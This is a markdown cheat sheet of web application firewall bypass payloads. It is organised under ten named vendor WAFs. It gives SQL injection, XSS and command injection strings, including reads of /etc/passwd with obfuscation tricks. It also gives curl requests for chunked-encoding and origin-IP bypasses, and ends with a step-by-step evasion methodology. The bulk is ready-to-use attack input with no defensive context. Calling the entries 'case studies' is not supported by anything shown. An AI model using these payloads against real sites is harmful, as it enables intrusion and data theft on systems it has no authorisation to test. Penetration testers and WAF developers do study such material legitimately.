# Real-World WAF Bypass Case Studies

## 1. Cloudflare SQLi Bypass
```sql
# Original blocked
' UNION SELECT 1,2,3-- -
# Bypass using comments
' /*!UNION*/ /*!SELECT*/ 1,2,3-- -
# Bypass using case
' %55NION %53ELECT 1,2,3-- -
```

## 2. ModSecurity XSS Bypass
```html
# Original blocked
<script>alert(1)</script>
# Bypass
<svg/onload=alert(1)>
<details open ontoggle=alert(1)>
<img src=x onerror=alert(1)>
```

## 3. AWS WAF RCE Bypass
```bash
# Original blocked
; cat /etc/passwd
# Bypass
; c'a't /etc/passwd
; {cat,/etc/passwd}
; cat${IFS}/etc/passwd
```

## 4. Akamai SQLi Bypass
```sql
# Original blocked
' OR '1'='1
# Bypass using encoding
' %4f%52 '1'='1
```

## 5. Imperva SQLi Bypass
```sql
# Original blocked
' UNION SELECT 1,2,3-- -
# Bypass using comments
' UN/**/ION SEL/**/ECT 1,2,3-- -
```

## 6. F5 BIG-IP XSS Bypass
```html
# Original blocked
<script>alert(1)</script>
# Bypass
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
```

## 7. Barracuda WAF Bypass
```bash
# Double encoding
%2527 OR %25271%2527=%25271
```

## 8. FortiWeb SQLi Bypass
```sql
# Original blocked
' UNION SELECT 1,2,3-- -
# Bypass using case
' uNiOn SeLeCt 1,2,3-- -
```

## 9. Citrix WAF Bypass
```bash
# Chunked transfer encoding
curl -sk -X POST "http://target/" -H "Transfer-Encoding: chunked" -d "payload"
```

## 10. Sucuri WAF Bypass
```bash
# Origin IP discovery
# DNS history to find real IP
curl -sk "http://origin_ip/" -H "Host: target.com"
```

## Bypass Methodology
1. Identify WAF (wafw00f)
2. Test basic payloads
3. Try encoding bypasses
4. Try case variations
5. Try comment bypasses
6. Try HTTP method bypass
7. Try Content-Type change
8. Try chunked transfer
9. Try origin IP bypass
10. Try protocol downgrade
